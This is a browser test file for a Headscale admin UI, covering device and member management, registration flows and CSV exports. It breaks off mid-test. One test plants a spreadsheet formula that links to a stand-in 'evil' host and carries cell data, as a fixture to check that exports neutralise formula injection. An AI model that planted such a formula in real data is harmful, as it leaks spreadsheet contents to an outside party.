import "fake-indexeddb/auto";
import type { FetchHandle } from "@defjs/core";
import { afterEach, expect, test, vi } from "vitest";
import { page, userEvent } from "vitest/browser";
import type { HeadscaleSnapshot } from "@/api/contracts";
import { parsePolicy } from "@/domain/policy-designer";
import { setLocale } from "@/i18n";
import { getProductCopy } from "@/i18n/product-copy";
import { expectNetworkTokensLtr } from "@/test/bidi";
import { authenticateTestSession, prepareTestSession, renderSessionPage } from "@/test/session";
import DevicesPage from "./DevicesPage";
import MembersPage from "./MembersPage";

const alice = { id: "1", name: "alice", displayName: "Alice", email: "alice@example.com" };
const bob = { id: "2", name: "bob", displayName: "Bob", email: "bob@example.com" };
function fixture(): HeadscaleSnapshot {
  return {
    health: { databaseConnectivity: true, serverReachable: true },
    version: { version: "0.29.4" },
    // Copies: the rename handler mutates backend users and must not leak into later tests.
    users: [{ ...alice }, { ...bob }, { id: "0", name: "tagged-devices" }],
    apiKeys: [],
    policy: {
      policy: JSON.stringify({
        groups: { "group:ops": ["alice@example.com"], "group:home": [] },
        tagOwners: { "tag:server": ["alice@example.com"], "tag:home": [] },
        acls: [
          {
            action: "accept",
            src: ["group:ops"],
            dst: ["tag:server:22"],
            proto: "tcp",
          },
        ],
      }),
    },
    nodes: [
      {
        id: "1",
        name: "edge",
        givenName: "edge-router",
        user: alice,
        online: true,
        ipAddresses: ["100.64.0.1", "fd7a::1"],
        approvedRoutes: ["10.42.0.0/16"],
        availableRoutes: ["10.42.0.0/16", "0.0.0.0/0"],
        subnetRoutes: [],
        tags: ["tag:server"],
      },
      {
        id: "2",
        name: "laptop",
        user: bob,
        online: false,
        ipAddresses: ["100.64.0.2"],
        approvedRoutes: [],
        availableRoutes: [],
        subnetRoutes: [],
        tags: [],
        expiry: "2000-01-01T00:00:00Z",
      },
    ],
    preAuthKeys: [
      {
        id: "1",
        key: "ready-key",
        user: alice,
        reusable: true,
        ephemeral: false,
        used: false,
        expiration: "2099-01-01T00:00:00Z",
        aclTags: [],
      },
    ],
  };
}
interface Call {
  method: string;
  path: string;
  body: Record<string, unknown>;
}
async function setup(kind: "devices" | "members", search = "", policyText?: string) {
  await page.viewport(1366, 768);
  const backend = fixture();
  if (policyText !== undefined) backend.policy = { policy: policyText };
  const calls: Call[] = [];
  let failure = "";
  let failurePath = "";
  let failureStatus = 500;
  let hold: Promise<void> | undefined;
  let writeHold: Promise<void> | undefined;
  let writeHoldMethod = "";
  const transport: FetchHandle = async (input, init) => {
    const request = input instanceof Request ? input : new Request(input, init);
    const url = new URL(request.url);
    const raw = await request.clone().text();
    const body = raw ? JSON.parse(raw) : Object.fromEntries(url.searchParams);
    calls.push({ method: request.method, path: url.pathname, body });
    if (hold && request.method === "GET") await hold;
    if (
      writeHold &&
      request.method !== "GET" &&
      (!writeHoldMethod || writeHoldMethod === request.method)
    )
      await writeHold;
    if (failure && request.method !== "GET" && (!failurePath || failurePath === url.pathname))
      return Response.json({ message: failure }, { status: failureStatus });
    if (request.method === "POST" && url.pathname === "/api/v1/user") {
      const user = { id: "3", ...body } as typeof bob;
      backend.users.push(user);
      return Response.json({ user });
    }
    if (
      request.method === "POST" &&
      url.pathname.includes("/user/") &&
      url.pathname.includes("/rename/")
    ) {
      const user = backend.users.find((u) => u.id === url.pathname.split("/")[4]);
      if (!user) throw new Error("Missing fixture user");
      user.name = decodeURIComponent(url.pathname.split("/").at(-1) ?? "");
      return Response.json({ user });
    }
    if (request.method === "DELETE" && url.pathname.includes("/user/")) {
      const id = url.pathname.split("/").at(-1);
      // Upstream refuses to delete a user that still owns nodes; the UI cannot know this in advance.
      if (backend.nodes.some((n) => n.user?.id === id))
        return Response.json(
          { code: 2, message: "user not empty: node(s) found" },
          { status: 500 },
        );
      backend.users = backend.users.filter((u) => u.id !== id);
      return Response.json({});
    }
    if (request.method === "PUT" && url.pathname === "/api/v1/policy") {
      backend.policy = { policy: String(body.policy) };
      return Response.json(backend.policy);
    }
    if (request.method === "POST" && url.pathname === "/api/v1/preauthkey") {
      const preAuthKey = {
        id: "2",
        key: "created-key",
        ...body,
        user: backend.users.find((u) => u.id === body.user),
        used: false,
      };
      // Headscale returns the full key only in the create response; later listings are masked.
      const { key } = preAuthKey;
      backend.preAuthKeys.push({ ...preAuthKey, key: "hskey-auth-abc-***" });
      return Response.json({ preAuthKey: { ...preAuthKey, key } });
    }
    if (request.method === "POST" && url.pathname === "/api/v1/auth/register") {
      const sourceNode = backend.nodes[0];
      if (!sourceNode) throw new Error("Missing fixture node");
      const node = { ...sourceNode, id: "3", name: "registered", givenName: "registered" };
      backend.nodes.push(node);
      return Response.json({ node });
    }
    if (
      request.method === "POST" &&
      (url.pathname === "/api/v1/auth/approve" || url.pathname === "/api/v1/auth/reject")
    )
      return Response.json({});
    if (url.pathname.includes("/node/") && request.method !== "GET") {
      const id = url.pathname.split("/")[4];
      const node = backend.nodes.find((n) => n.id === id);
      if (!node) throw new Error("Missing fixture node");
      if (request.method === "DELETE") {
        backend.nodes = backend.nodes.filter((n) => n.id !== id);
        return Response.json({});
      }
      if (url.pathname.includes("/rename/"))
        node.givenName = decodeURIComponent(url.pathname.split("/").at(-1) ?? "");
      if (url.pathname.endsWith("/tags")) node.tags = body.tags as string[];
      if (url.pathname.endsWith("/expire")) {
        if (body.disableExpiry === "true") delete node.expiry;
        else node.expiry = "2000-01-01T00:00:00Z";
      }
      return Response.json({ node });
    }
    const responses: Record<string, unknown> = {
      "/api/v1/health": backend.health,
      "/version": backend.version,
      "/api/v1/user": { users: backend.users },
      "/api/v1/node": { nodes: backend.nodes },
      "/api/v1/preauthkey": { preAuthKeys: backend.preAuthKeys },
      "/api/v1/apikey": { apiKeys: [] },
      "/api/v1/policy": backend.policy,
    };
    return Response.json(responses[url.pathname]);
  };
  const session = await prepareTestSession(transport);
  await setLocale("en-US");
  await authenticateTestSession(session);
  const rendered = await renderSessionPage(
    session,
    kind === "devices" ? <DevicesPage /> : <MembersPage />,
    `/${kind}${search}`,
  );
  await expect
    .poll(() => session.snapshot.getSnapshot().snapshot.health?.serverReachable)
    .toBe(true);
  await expect.poll(() => session.snapshot.isRefreshing).toBe(false);
  calls.length = 0;
  return {
    backend,
    calls,
    session,
    ...rendered,
    fail: (value: string, path = "", status = 500) => {
      failure = value;
      failurePath = path;
      failureStatus = status;
    },
    pauseWrites: (method = "") => {
      writeHoldMethod = method;
      let release: (() => void) | undefined;
      writeHold = new Promise<void>((resolve) => {
        release = resolve;
      });
      return () => {
        writeHold = undefined;
        release?.();
      };
    },
    pause: () => {
      let release!: () => void;
      hold = new Promise<void>((resolve) => {
        release = resolve;
      });
      return () => {
        hold = undefined;
        release();
      };
    },
  };
}
afterEach(() => vi.restoreAllMocks());
// Page tests run on the system clock because session and bridge timers read Date.now().
// The delete dialog blocks a user that still owns machines in the snapshot, so both are released.
function releaseNodes(ctx: Awaited<ReturnType<typeof setup>>, userId: string) {
  ctx.backend.nodes = ctx.backend.nodes.filter((n) => n.user?.id !== userId);
  ctx.session.snapshot.applyPatch({ nodes: structuredClone(ctx.backend.nodes) });
}
function expectAboutDaysFromNow(value: unknown, days: number) {
  const delta = Date.parse(String(value)) - (Date.now() + days * 86_400_000);
  expect(delta).toBeGreaterThan(-120_000);
  expect(delta).toBeLessThan(120_000);
}
const copy = getProductCopy("en-US");
// A host edit stands in for unsaved work on the Access page.
function makeDirty(ctx: Awaited<ReturnType<typeof setup>>) {
  const state = ctx.session.policy.policyDesignerState;
  ctx.session.policy.commitState({
    ...state,
    extras: { ...state.extras, hosts: { draft: "10.95.0.0/16" } },
  });
}
function discardDraft(ctx: Awaited<ReturnType<typeof setup>>) {
  ctx.session.policy.commitState(parsePolicy(ctx.session.policy.getSnapshot().policyDraft));
}
function sectionRows(testid: string) {
  return Array.from(document.querySelectorAll(`[data-testid="${testid}"]`), (row) =>
    String(row.textContent),
  ).sort();
}
async function deviceAction(action: string, id = "1") {
  await page.getByTestId(`machine-actions-trigger-${id}`).click();
  await page.getByTestId(`${action}-node-action-${id}`).click();
}
async function memberAction(action: string, name = "bob") {
  await page.getByTestId(`member-actions-trigger-${name}`).click();
  await page.getByTestId(`${action}-member-${name}`).click();
}

test("unreadable policy blocks assignments and cleanup deletion until cleanup is explicitly declined", async () => {
  const unreadable = '{"acls":[';
  const ctx = await setup("members", "", unreadable);
  await page.getByTestId("member-actions-trigger-alice").click();
  await expect
    .element(page.getByTestId("assign-member-groups-alice"))
    .toHaveAttribute("aria-disabled", "true");
  await expect
    .element(page.getByTestId("assign-member-tags-alice"))
    .toHaveAttribute("aria-disabled", "true");
  await userEvent.keyboard("{Escape}");
  await expect.element(page.getByRole("alert")).toMatchTextContent(/policy.+safely/i);
  await memberAction("delete", "alice");
  await expect.element(page.getByTestId("confirm-delete-member")).toBeDisabled();
  await expect
    .element(page.getByTestId("delete-member-cleanup-policy"))
    .toHaveAttribute("aria-checked", "true");
  expect(ctx.calls.filter((call) => call.method !== "GET")).toEqual([]);
  expect(ctx.backend.policy?.policy).toBe(unreadable);
  releaseNodes(ctx, "1");
  await page.getByTestId("delete-member-cleanup-policy").click();
  await expect.element(page.getByTestId("confirm-delete-member")).toBeEnabled();
  await page.getByTestId("confirm-delete-member").click();
  await expect.element(page.getByTestId("member-alice")).not.toBeInTheDocument();
  expect(ctx.calls.filter((call) => call.method !== "GET")).toEqual([
    { method: "DELETE", path: "/api/v1/user/1", body: {} },
  ]);
  expect(ctx.backend.policy?.policy).toBe(unreadable);
});

test("a policy that becomes unreadable while delete confirmation is open blocks both cleanup and deletion", async () => {
  const ctx = await setup("members");
  releaseNodes(ctx, "1");
  await memberAction("delete", "alice");
  await expect.element(page.getByTestId("confirm-delete-member")).toBeEnabled();
  const unreadable = '{"groups":';
  ctx.backend.policy = { policy: unreadable };
  ctx.session.snapshot.applyPatch({ policy: ctx.backend.policy });
  await expect.element(page.getByTestId("confirm-delete-member")).toBeDisabled();
  expect(ctx.calls.filter((call) => call.method !== "GET")).toEqual([]);
  expect(ctx.session.policy.getSnapshot().policyDraft).toBe(unreadable);

  ctx.backend.policy = {
    policy: '{/* fixed */ "groups":{"group:ops":["alice@example.com",],},"acls":[],}',
  };
  ctx.session.snapshot.applyPatch({ policy: ctx.backend.policy });
  await expect.element(page.getByTestId("confirm-delete-member")).toBeEnabled();
  await page.getByTestId("confirm-delete-member").click();
  await expect.element(page.getByTestId("delete-member-dialog")).not.toBeInTheDocument();
  await expect.element(page.getByTestId("member-alice")).not.toBeInTheDocument();
  expect(ctx.calls.filter((call) => call.method !== "GET").map((call) => call.method)).toEqual([
    "DELETE",
    "PUT",
  ]);
  expect(JSON.parse(ctx.backend.policy?.policy ?? "null").groups).toEqual({ "group:ops": [] });
});
// Catches lost search fields, filter conjunction, refresh scope, or leaked tagged-service users.
test("devices search and status filters compose and refresh only fabric and identity", async () => {
  const ctx = await setup("devices");
  await page.getByTestId("device-search").fill("fd7a");
  await expect.element(page.getByTestId("device-1")).toBeVisible();
  await expect.element(page.getByTestId("device-2")).not.toBeInTheDocument();
  await page.getByTestId("machine-filter").selectOptions("offline");
  await expect.element(page.getByTestId("machine-list")).toMatchTextContent("No machines");
  await page.getByTestId("clear-machine-filters").click();
  await page.getByTestId("machine-filter").selectOptions("expired");
  await expect.element(page.getByTestId("device-2")).toBeVisible();
  await page.getByTestId("refresh-machines").click();
  await expect.poll(() => ctx.calls.some((c) => c.path === "/api/v1/node")).toBe(true);
  expect(ctx.calls.some((c) => c.path === "/api/v1/policy")).toBe(false);
});
// Catches stale refresh overwriting edited rename or failure hiding the draft.
test("device rename preserves the draft during late refresh and retries an inline failure", async () => {
  const ctx = await setup("devices");
  const release = ctx.pause();
  await deviceAction("rename");
  await page.getByTestId("rename-node-dialog-input").fill("edited-name");
  const node = ctx.backend.nodes[0];
  if (!node) throw new Error("Missing fixture node");
  node.givenName = "server-refresh";
  release();
  await expect.poll(() => ctx.session.snapshot.isRefreshing).toBe(false);
  await expect.element(page.getByTestId("rename-node-dialog-input")).toHaveValue("edited-name");
  ctx.fail("Rename denied");
  await page.getByTestId("rename-node-confirm").click();
  await expect.element(page.getByTestId("rename-node-error")).toMatchTextContent("Rename denied");
  ctx.fail("");
  await page.getByTestId("rename-node-confirm").click();
  await expect.element(page.getByTestId("device-1")).toMatchTextContent("edited-name");
  await expect.element(page.getByTestId("rename-node-dialog")).not.toBeInTheDocument();
});
// Catches destructive writes before confirmation and lost retry/error state.
test("device expire and remove require confirmation and keep failures visible", async () => {
  const ctx = await setup("devices");
  await deviceAction("expire", "1");
  expect(ctx.calls.filter((c) => c.method !== "GET")).toEqual([]);
  await page.getByTestId("expire-node-cancel").click();
  await deviceAction("expire", "1");
  ctx.fail("Cannot expire");
  await page.getByTestId("expire-node-confirm").click();
  await expect.element(page.getByTestId("expire-node-error")).toMatchTextContent("Cannot expire");
  ctx.fail("");
  await page.getByTestId("expire-node-confirm").click();
  await expect.element(page.getByTestId("expire-node-dialog")).not.toBeInTheDocument();
  await deviceAction("remove", "2");
  await page.getByTestId("remove-node-confirm").click();
  await expect.element(page.getByTestId("device-2")).not.toBeInTheDocument();
});
// Catches changed tag payload or loss of node-detail owner navigation.
test("device tags update backend and details navigate to the owner popup", async () => {
  const ctx = await setup("devices");
  await page.getByTestId("machine-actions-trigger-1").click();
  await page.getByTestId("edit-node-tags-action-1").click();
  await page.getByTestId("node-tags-input").fill("tag:server, tag:prod");
  await page.getByTestId("node-tags-confirm").click();
  await expect.element(page.getByTestId("device-1")).toMatchTextContent("tag:prod");
  await page.getByTestId("device-detail-link-1").click();
  await expect.element(page.getByTestId("device-detail-dialog")).toMatchTextContent("fd7a::1");
  await page.getByTestId("device-detail-owner-1").click();
  expect(ctx.router.state.location.search).toEqual({ user: "1", from: "devices", popup: "user" });
  expect(ctx.backend.nodes[0]?.tags).toEqual(["tag:server", "tag:prod"]);
});
const AUTH_ID = "hskey-authreq-a1B2c3D4e5F6g7H8i9J0k1L2";
async function openPending() {
  await page.getByTestId("add-device-toggle").click();
  await page.getByTestId("add-pending-node").click();
}
function writes(ctx: Awaited<ReturnType<typeof setup>>) {
  return ctx.calls.filter((call) => call.method !== "GET");
}
// Catches registration payload loss, wizard-step omission, and absent result.
test("pending registration follows the wizard and submits the chosen user and request id", async () => {
  const ctx = await setup("devices");
  await openPending();
  await page.getByTestId("pending-registration-user").selectOptions("bob");
  await page.getByTestId("pending-node-key").fill(AUTH_ID);
  await page.getByTestId("register-pending-node").click();
  await expect.element(page.getByTestId("registration-result")).toMatchTextContent("registered");
  expect(writes(ctx)).toEqual([
    { method: "POST", path: "/api/v1/auth/register", body: { user: "bob", authId: AUTH_ID } },
  ]);
  expect(ctx.calls.some((c) => c.path === "/api/v1/node/register")).toBe(false);
  expect(ctx.session.deviceSetup.getSnapshot().pendingRegistrationForm.key).toBe("");
});
// Catches a malformed id reaching the server through any of the three actions.
test("invalid request text disables every action and sends nothing", async () => {
  const ctx = await setup("devices");
  await openPending();
  await expect.element(page.getByTestId("register-pending-node")).toBeDisabled();
  await expect.element(page.getByTestId("pending-node-key-hint")).not.toBeInTheDocument();
  await page.getByTestId("pending-node-key").fill("registration-key");
  await expect.element(page.getByTestId("pending-node-key-hint")).toBeVisible();
  await expect
    .element(page.getByTestId("pending-node-key"))
    .toHaveAttribute("aria-invalid", "true");
  await expect
    .element(page.getByTestId("pending-node-key"))
    .toHaveAttribute("aria-describedby", "pending-node-key-hint");
  await expect.element(page.getByTestId("register-pending-node")).toBeDisabled();
  await page.getByTestId("pending-registration-kind").selectOptions("ssh");
  await expect.element(page.getByTestId("approve-ssh-check")).toBeDisabled();
  await expect.element(page.getByTestId("reject-ssh-check")).toBeDisabled();
  expect(writes(ctx)).toEqual([]);
});
// Catches a pasted link being sent whole instead of reduced to the bare id.
test("a pasted registration link is reduced to the bare request id", async () => {
  const ctx = await setup("devices");
  await openPending();
  await page
    .getByTestId("pending-node-key")
    .fill(`  https://hs.example.test/register/${AUTH_ID}  `);
  await expect.element(page.getByTestId("register-pending-node")).toBeEnabled();
  await page.getByTestId("register-pending-node").click();
  await expect.element(page.getByTestId("registration-result")).toBeVisible();
  expect(writes(ctx)[0]?.body).toEqual({ user: "alice", authId: AUTH_ID });
});
// Catches registering an SSH check link, which Headscale may not survive.
test("an SSH check link in device mode is blocked with an explanation", async () => {
  const ctx = await setup("devices");
  await openPending();
  await page.getByTestId("pending-node-key").fill(`https://hs.example.test/auth/${AUTH_ID}`);
  await expect.element(page.getByTestId("pending-node-key-hint")).toMatchTextContent("SSH check");
  await expect.element(page.getByTestId("register-pending-node")).toBeDisabled();
  expect(writes(ctx)).toEqual([]);
});
// Catches approving a device sign-in link as an SSH check.
test("a registration link in SSH mode is blocked and the owner select is hidden", async () => {
  const ctx = await setup("devices");
  await openPending();
  await page.getByTestId("pending-registration-kind").selectOptions("ssh");
  await expect.element(page.getByTestId("pending-registration-user")).not.toBeInTheDocument();
  await expect.element(page.getByTestId("register-pending-node")).not.toBeInTheDocument();
  await page.getByTestId("pending-node-key").fill(`https://hs.example.test/register/${AUTH_ID}`);
  await expect
    .element(page.getByTestId("pending-node-key-hint"))
    .toMatchTextContent("device sign-in");
  await expect.element(page.getByTestId("approve-ssh-check")).toBeDisabled();
  await expect.element(page.getByTestId("reject-ssh-check")).toBeDisabled();
  expect(writes(ctx)).toEqual([]);
});
// Catches approve/reject payload mistakes, a refresh after a quiet write, and a stale field.
test.each([
  { action: "approve", path: "/api/v1/auth/approve", result: "approved" },
  { action: "reject", path: "/api/v1/auth/reject", result: "rejected" },
])(
  "$action sends only the request id, reports the decision and does not refresh",
  async ({ action, path, result }) => {
    const ctx = await setup("devices");
    await openPending();
    await page.getByTestId("pending-registration-kind").selectOptions("ssh");
    await page.getByTestId("pending-node-key").fill(AUTH_ID);
    await page.getByTestId(`${action}-ssh-check`).click();
    await expect.element(page.getByTestId("ssh-check-result")).toMatchTextContent(result);
    expect(ctx.calls).toEqual([{ method: "POST", path, body: { authId: AUTH_ID } }]);
    await expect.element(page.getByTestId("pending-node-key")).toHaveValue("");
    await page.getByTestId("pending-node-key").fill("x");
    await expect.element(page.getByTestId("ssh-check-result")).not.toBeInTheDocument();
  },
);
// Catches a server rejection being swallowed or rewritten.
test("an unknown request id renders the server message under the clicked button", async () => {
  const ctx = await setup("devices");
  await openPending();
  await page.getByTestId("pending-registration-kind").selectOptions("ssh");
  await page.getByTestId("pending-node-key").fill(AUTH_ID);
  ctx.fail("no pending auth session for auth_id", "/api/v1/auth/approve", 404);
  await page.getByTestId("approve-ssh-check").click();
  await expect
    .element(page.getByTestId("approve-ssh-check-error"))
    .toMatchTextContent("no pending auth session for auth_id");
  await expect.element(page.getByTestId("ssh-check-result")).not.toBeInTheDocument();
  await expect.element(page.getByTestId("pending-node-key")).toHaveValue(AUTH_ID);
  ctx.fail("no pending auth session for auth_id", "/api/v1/auth/reject", 404);
  await page.getByTestId("reject-ssh-check").click();
  await expect
    .element(page.getByTestId("reject-ssh-check-error"))
    .toMatchTextContent("no pending auth session for auth_id");
});
// Catches closing the dialog or re-sending while an auth write is in flight.
test("the pending dialog cannot close and nothing is re-sent while a request is held", async () => {
  const ctx = await setup("devices");
  await openPending();
  await page.getByTestId("pending-registration-kind").selectOptions("ssh");
  await page.getByTestId("pending-node-key").fill(AUTH_ID);
  const release = ctx.pauseWrites("POST");
  await page.getByTestId("approve-ssh-check").click();
  await expect.element(page.getByTestId("approve-ssh-check")).toBeDisabled();
  await expect.element(page.getByTestId("reject-ssh-check")).toBeDisabled();
  await userEvent.keyboard("{Escape}");
  await expect.element(page.getByTestId("pending-registration-flow")).toBeVisible();
  release();
  await expect.element(page.getByTestId("ssh-check-result")).toBeVisible();
  expect(writes(ctx)).toHaveLength(1);
  await userEvent.keyboard("{Escape}");
  await expect.element(page.getByTestId("pending-registration-flow")).not.toBeInTheDocument();
  await openPending();
  await expect.element(page.getByTestId("ssh-check-result")).not.toBeInTheDocument();
});
// Catches a changed type keeping the previous decision or error on screen.
test("changing the request type clears the previous decision", async () => {
  await setup("devices");
  await openPending();
  await page.getByTestId("pending-registration-kind").selectOptions("ssh");
  await page.getByTestId("pending-node-key").fill(AUTH_ID);
  await page.getByTestId("reject-ssh-check").click();
  await expect.element(page.getByTestId("ssh-check-result")).toBeVisible();
  await page.getByTestId("pending-registration-kind").selectOptions("device");
  await expect.element(page.getByTestId("ssh-check-result")).not.toBeInTheDocument();
});
// Catches a bidi locale flipping the protocol token input.
test("the request input stays left-to-right in Arabic", async () => {
  await setup("devices");
  await setLocale("ar");
  await openPending();
  await expect.element(page.getByTestId("pending-node-key")).toHaveAttribute("dir", "ltr");
});
// Catches dropped owner/email fields, incorrect roles, or refresh including unrelated fabric.
test("members hide invisible users and filter by search", async () => {
  const ctx = await setup("members");
  await expect.element(page.getByTestId("member-tagged-devices")).not.toBeInTheDocument();
  await page.getByTestId("user-search").fill("bob@example");
  await expect.element(page.getByTestId("member-bob")).toBeVisible();
  await expect.element(page.getByTestId("member-alice")).not.toBeInTheDocument();
  await page.getByTestId("user-search").fill("bob@example zzz");
  await expect.element(page.getByTestId("user-table")).toMatchTextContent("No users match");
  await page.getByTestId("refresh-users").click();
  await expect.poll(() => ctx.calls.some((c) => c.path === "/api/v1/user")).toBe(true);
  expect(ctx.calls.some((c) => c.path === "/api/v1/node")).toBe(false);
});
// Catches missing controlled form fields, failed creation losing draft, or omitted rename/delete paths.
test("member creation retains failed drafts then rename and deletion update the visible rows", async () => {
  const ctx = await setup("members");
  await page.getByTestId("open-create-member").click();
  await page.getByTestId("member-name").fill("charlie");
  await page.getByTestId("member-display").fill("Charlie");
  await page.getByTestId("member-email").fill("charlie@example.com");
  ctx.fail("Create denied");
  await page.getByTestId("create-member").click();
  await expect.element(page.getByTestId("create-member-error")).toMatchTextContent("Create denied");
  await expect.element(page.getByTestId("member-name")).toHaveValue("charlie");
  ctx.fail("");
  await page.getByTestId("create-member").click();
  await expect.element(page.getByTestId("member-charlie")).toBeVisible();
  await memberAction("rename", "charlie");
  await page.getByTestId("rename-member-name").fill("charlie-renamed");
  await userEvent.keyboard("{Enter}");
  await expect.element(page.getByTestId("member-charlie-renamed")).toBeVisible();
  await memberAction("delete", "charlie-renamed");
  ctx.fail("Delete denied");
  await page.getByTestId("confirm-delete-member").click();
  await expect.element(page.getByTestId("delete-member-error")).toMatchTextContent("Delete denied");
  ctx.fail("");
  await page.getByTestId("confirm-delete-member").click();
  await expect.element(page.getByTestId("member-charlie-renamed")).not.toBeInTheDocument();
});
// Catches dropping identity principals or discarding drafts while loading group/tag memberships.
test("assigning groups and tag ownership saves the edited policy principals", async () => {
  const ctx = await setup("members");
  for (const kind of ["groups", "tags"]) {
    await page.getByTestId("member-actions-trigger-bob").click();
    await page.getByTestId(`assign-member-${kind}-bob`).click();
    const buttons = document.querySelectorAll<HTMLButtonElement>(
      `[data-testid^="assign-user-${kind}-option-"]`,
    );
    expect(buttons.length).toBe(2);
    const button = buttons[0];
    if (!button) throw new Error("Missing assignment option");
    button.click();
    await page.getByTestId(`assign-user-${kind}-apply`).click();
    await expect.element(page.getByTestId(`assign-user-${kind}-dialog`)).not.toBeInTheDocument();
  }
  const policy = JSON.parse(ctx.backend.policy?.policy ?? "");
  expect(Object.values(policy.groups).flat()).toContain("bob@example.com");
  expect(Object.values(policy.tagOwners).flat()).toContain("bob@example.com");
});
// Catches popup intent opening without explicit popup, or losing contextual navigation.
test("member popup intent requires popup=user and machine links retain member origin", async () => {
  const ctx = await setup("members", "?user=1");
  await expect.element(page.getByTestId("user-detail-dialog")).not.toBeInTheDocument();
  await page.getByTestId("member-device-tag-alice-1").click();
  expect(ctx.router.state.location.search).toEqual({ node: "1", from: "members", popup: "node" });
});
// Catches a late detail refresh reopening a dismissed node.
test("canceled node details ignore an in-flight opening refresh", async () => {
  const ctx = await setup("devices", "?node=1&popup=node&from=members&user=1");
  await expect.element(page.getByTestId("device-detail-dialog")).toBeVisible();
  await userEvent.keyboard("{Escape}");
  await expect.element(page.getByTestId("device-detail-dialog")).not.toBeInTheDocument();
  expect(ctx.router.state.location.pathname).toBe("/members");
  expect(ctx.router.state.location.search).toEqual({ user: "1" });
});
// Catches lost server/client defaults, incorrect expiry clamping, or a generated key not returning to the wizard.
for (const task of ["server", "client"] as const) {
  test(`${task} setup generates the matching auth key and install command`, async () => {
    const ctx = await setup("devices");
    await page.getByTestId("add-device-toggle").click();
    await page.getByTestId(task === "server" ? "add-linux-device" : "add-client-device").click();
    await expect
      .element(page.getByTestId("setup-tags"))
      .toHaveValue(task === "server" ? "tag:server" : "");
    await expect
      .element(page.getByTestId("setup-ephemeral"))
      .toHaveAttribute("aria-checked", "false");
    await page.getByTestId("add-device-next").click();
    await expect
      .element(page.getByTestId("setup-reusable"))
      .toHaveAttribute("aria-checked", task === "server" ? "true" : "false");
    await expect.element(page.getByTestId("setup-owner")).toHaveValue("1");
    await page.getByTestId("setup-expiration").fill("95");
    await userEvent.tab();
    await expect.element(page.getByTestId("setup-expiration")).toHaveValue("90");
    await page.getByTestId("add-device-next").click();
    await page.getByTestId("generate-install-script").click();
    await expect.element(page.getByTestId("add-device-dialog")).toBeVisible();
    await expect
      .element(page.getByTestId("created-invite"))
      .toMatchTextContent(
        "tailscale up --login-server https://fixture.invalid --authkey created-key",
      );
    const created = ctx.backend.preAuthKeys.find((k) => k.id === "2");
    expect(created).toMatchObject({
      reusable: task === "server",
      ephemeral: false,
      aclTags: task === "server" ? ["tag:server"] : [],
    });
    const expiry = new Date(created?.expiration ?? "").getTime();
    expect(expiry - Date.now()).toBeGreaterThan(89 * 86400000);
    expect(expiry - Date.now()).toBeLessThanOrEqual(90 * 86400000);
    const write = vi.spyOn(navigator.clipboard, "writeText").mockResolvedValue();
    await page.getByTestId("copy-setup-install-command").click();
    expect(write).toHaveBeenCalledWith(
      "tailscale up --login-server https://fixture.invalid --authkey created-key",
    );
    await page.getByTestId("add-device-finish").click();
    await expect.element(page.getByTestId("add-device-dialog")).not.toBeInTheDocument();
  });
}
// Catches clearing all data accidentally or the first-device action skipping the setup flow.
test("empty devices offer the first-device wizard", async () => {
  const ctx = await setup("devices");
  ctx.session.snapshot.applyPatch({ nodes: [] });
  await expect.element(page.getByTestId("machines-empty")).toBeVisible();
  await page.getByTestId("add-first-device").click();
  await expect.element(page.getByTestId("add-device-dialog")).toBeVisible();
  await expect.element(page.getByTestId("setup-device-step")).toBeVisible();
});
// Catches closing a detail dialog reopening it when its pending read finishes.
test("late detail and rename refreshes cannot restore canceled or deleted targets", async () => {
  const ctx = await setup("devices");
  let release = ctx.pause();
  await page.getByTestId("device-detail-link-1").click();
  await userEvent.keyboard("{Escape}");
  release();
  await expect.poll(() => ctx.session.snapshot.isRefreshing).toBe(false);
  await expect.element(page.getByTestId("device-detail-dialog")).not.toBeInTheDocument();
  release = ctx.pause();
  await deviceAction("rename");
  ctx.backend.nodes = ctx.backend.nodes.filter((n) => n.id !== "1");
  release();
  await expect.element(page.getByTestId("rename-node-dialog")).not.toBeInTheDocument();
  expect(ctx.calls.filter((c) => c.method !== "GET")).toEqual([]);
});
// Catches exports using the full snapshot rather than the currently filtered rows.
test("device and member exports contain only matching rows", async () => {
  let blob: Blob | undefined;
  const downloads: string[] = [];
  vi.spyOn(URL, "createObjectURL").mockImplementation((value) => {
    blob = value as Blob;
    return "blob:fixture";
  });
  vi.spyOn(URL, "revokeObjectURL").mockImplementation(() => {});
  vi.spyOn(HTMLAnchorElement.prototype, "click").mockImplementation(function (
    this: HTMLAnchorElement,
  ) {
    downloads.push(this.download);
  });
  const ctx = await setup("devices");
  await page.getByTestId("device-search").fill("edge");
  await page.getByTestId("export-machines").click();
  expect(downloads).toEqual(["headscale-machines.csv"]);
  expect(blob?.type).toBe("text/csv;charset=utf-8");
  const csv = await blob?.text();
  expect(csv).toContain("edge-router");
  expect(csv).not.toContain("laptop");
  await ctx.unmount();
  await setup("members");
  await page.getByTestId("user-search").fill("bob");
  await page.getByTestId("export-users").click();
  expect(downloads).toEqual(["headscale-machines.csv", "headscale-users.csv"]);
  expect(await blob?.text()).toContain("Bob");
  expect(await blob?.text()).not.toContain("Alice");
});
function captureDownloads() {
  const csv = { text: async (): Promise<string | undefined> => undefined };
  vi.spyOn(URL, "createObjectURL").mockImplementation((value) => {
    csv.text = () => (value as Blob).text();
    return "blob:fixture";
  });
  vi.spyOn(URL, "revokeObjectURL").mockImplementation(() => {});
  vi.spyOn(HTMLAnchorElement.prototype, "click").mockImplementation(() => {});
  return csv;
}
const header = (columns: string[]) => columns.map((c) => `"${c}"`).join(",");

// Catches an empty export that downloads a placeholder header instead of the declared columns.
test("empty exports download only the header row", async () => {
  const csv = captureDownloads();
  const devices = await setup("devices");
  await page.getByTestId("device-search").fill("zzz-no-match");
  await expect.element(page.getByTestId("export-machines")).toBeEnabled();
  await page.getByTestId("export-machines").click();
  expect(await csv.text()).toBe(
    header([
      "name",
      "owner",
      "status",
      "addresses",
      "tags",
      "advertisedRoutes",
      "approvedRoutes",
      "lastSeen",
      "expires",
    ]),
  );
  await devices.unmount();
  await setup("members");
  await page.getByTestId("user-search").fill("zzz-no-match");
  // The members export is disabled instead of downloading an empty file.
  await expect.element(page.getByTestId("export-users")).toBeDisabled();
});

// Catches server-controlled names that a spreadsheet would evaluate as formulas.
test("exports neutralise spreadsheet formulas in server-controlled names", async () => {
  const csv = captureDownloads();
  const formula = '=HYPERLINK("http://evil/?"&A2,"click")';
  const mallory = { id: "9", name: "mallory", displayName: formula, email: "m@example.com" };
  const ctx = await setup("devices");
  ctx.backend.users.push(mallory);
  ctx.backend.nodes.push({
    id: "9",
    name: "mallory-pc",
    user: mallory,
    online: false,
